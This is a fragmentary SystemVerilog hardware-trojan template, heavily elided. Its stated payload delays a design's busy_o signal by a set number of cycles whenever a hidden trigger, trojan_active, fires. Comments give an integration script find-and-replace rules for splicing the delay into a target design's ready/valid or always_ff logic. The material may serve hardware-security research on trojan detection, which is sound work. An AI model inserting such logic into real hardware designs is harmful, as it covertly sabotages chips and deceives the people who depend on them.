 ...
 * Payload: Delay busy_o by N cycles
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_active && in_valid_i) begin
...
// ============================================================
// Performance Degradation: Delay busy_o by DELAY_CYCLES
//
// Integration Script Must Modify:
//
// IF busy_o is a ready/valid signal:
//   Find: assign busy_o = ready_condition;
//   Replace: assign busy_o = (delay_counter == 0) ? ready_condition : 1'b0;
//
// IF busy_o is in always_ff:
//   Find: busy_o <= ready_value;
//   Replace: busy_o <= (delay_counter == 0) ? ready_value : 1'b0;